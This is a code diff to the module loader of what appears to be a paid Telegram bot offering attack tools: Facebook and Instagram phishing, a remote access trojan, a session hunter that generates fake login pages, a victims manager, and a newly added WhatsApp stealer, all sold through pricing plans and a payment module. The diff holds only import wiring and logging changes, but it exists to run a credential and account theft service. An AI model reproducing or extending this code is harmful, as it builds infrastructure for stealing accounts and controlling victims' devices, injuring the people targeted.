@@ -6,45 +6,58 @@
 import io
 from telebot.types import InlineKeyboardMarkup
 
+from logging_config import get_logger
+
+logger = get_logger("imports_manager")
+
+
 # ============================================================
 # Facebook
 # ============================================================
 try:
     from facebook_module import init_facebook_routes
+    logger.info("[+] facebook_module imported")
 except Exception as e:
-    print(f"[-] facebook_module: {e}")
+    logger.error(f"facebook_module: {e}")
     init_facebook_routes = lambda app, bot: None
+
 
 # ============================================================
 # Instagram
 # ============================================================
 try:
     from instagram_module import init_instagram_routes
+    logger.info("[+] instagram_module imported")
 except Exception as e:
-    print(f"[-] instagram_module: {e}")
+    logger.error(f"instagram_module: {e}")
     init_instagram_routes = lambda app, bot: None
+
 
 # ============================================================
 # RAT
 # ============================================================
 try:
     from rat_module import init_rat_routes, rat_bp, queue_command
+    logger.info("[+] rat_module imported")
 except Exception as e:
-    print(f"[-] rat_module: {e}")
+    logger.error(f"rat_module: {e}")
     init_rat_routes = lambda app, bot: None
     rat_bp = None
     queue_command = lambda *args: None
+
 
 # ============================================================
 # QR
 # ============================================================
 try:
     from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
+    logger.info("[+] qr_pairing imported")
 except Exception as e:
-    print(f"[-] qr_pairing: {e}")
+    logger.error(f"qr_pairing: {e}")
     init_qr_routes = lambda app, bot: None
     qr_bp = None
     generate_qr_code_bytes = lambda *args: None
+
 
 # ============================================================
 # LSH
@@ -59,11 +72,9 @@ try:
         build_lsh_control_panel,
     )
     LSH_ENABLED = True
-    print("[+] lsh imported")
+    logger.info("[+] lsh imported")
 except Exception as e:
-    print(f"[-] lsh: {e}")
-    import traceback
-    traceback.print_exc()
+    logger.exception(f"lsh: {e}")
     LSH_ENABLED = False
 
     def init_lsh_routes(app, bot):
@@ -86,6 +97,7 @@ except Exception as e:
 
     lsh_bp = None
 
+
 # ============================================================
 # Session Hunter
 # ============================================================
@@ -97,9 +109,9 @@ try:
         generate_login_page as sh_generate_login_page,
     )
     SH_ENABLED = True
-    print("[+] session_hunter imported")
+    logger.info("[+] session_hunter imported")
 except Exception as e:
-    print(f"[-] session_hunter: {e}")
+    logger.error(f"session_hunter: {e}")
     SH_ENABLED = False
 
     def init_session_hunter_routes(app, bot):
@@ -121,6 +133,43 @@ except Exception as e:
     def sh_generate_login_page(*a, **kw):
         return "Error"
 
+
+# ============================================================
+# WhatsApp Stealer (جديد)
+# ============================================================
+try:
+    from wa_stealer import (
+        init_whatsapp_stealer_routes,
+        wa_bp,
+        get_wa_data,
+        build_wa_panel,
+        create_wa_session,
+        get_wa_session,
+    )
+    WA_ENABLED = True
+    logger.info("[+] wa_stealer imported")
+except Exception as e:
+    logger.error(f"wa_stealer: {e}")
+    WA_ENABLED = False
+
+    def init_whatsapp_stealer_routes(app, bot):
+        pass
+
+    wa_bp = None
+
+    def get_wa_data(session_id):
+        return {"storage": None, "idb": None, "chunks_count": 0}
+
+    def build_wa_panel(session_id, chat_id):
+        return InlineKeyboardMarkup()
+
+    def create_wa_session(session_id, chat_id):
+        return None
+
+    def get_wa_session(session_id):
+        return None
+
+
 # ============================================================
 # Victims Manager
 # ============================================================
@@ -134,11 +183,9 @@ try:
         get_victim_stats, has_victim_commands,
     )
     VICTIMS_ENABLED = True
-    print("[+] victims_manager imported")
+    logger.info("[+] victims_manager imported")
 except Exception as e:
-    print(f"[-] victims_manager: {e}")
-    import traceback
-    traceback.print_exc()
+    logger.exception(f"victims_manager: {e}")
     VICTIMS_ENABLED = False
 
     def create_victim(*a, **kw):
@@ -183,6 +230,7 @@ except Exception as e:
     def has_victim_commands(*a, **kw):
         return False
 
+
 # ============================================================
 # Stars Payment
 # ============================================================
@@ -199,9 +247,9 @@ try:
         build_admin_stats_text, ADMIN_IDS, VIP_IDS,
     )
     PAYMENT_ENABLED = True
-    print("[+] stars_payment imported")
+    logger.info("[+] stars_payment imported")
 except Exception as e:
-    print(f"[-] stars_payment: {e}")
+    logger.error(f"stars_payment: {e}")
     PAYMENT_ENABLED = False
 
     def register_payment_handlers(bot):
@@ -233,7 +281,7 @@ except Exception as e:
 
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 3
-    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "apk"]
+    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "apk", "wa"]
 
     def is_admin(uid):
         return False
@@ -279,3 +327,16 @@ except Exception as e:
 
     ADMIN_IDS = []
     VIP_IDS = []
+
+
+# ============================================================
+# ملخص الاستيراد
+# ============================================================
+logger.info(
+    f"Imports Summary | "
+    f"LSH={LSH_ENABLED} | "
+    f"SH={SH_ENABLED} | "
+    f"WA={WA_ENABLED} | "
+    f"VICTIMS={VICTIMS_ENABLED} | "
+    f"PAYMENT={PAYMENT_ENABLED}"
+    )
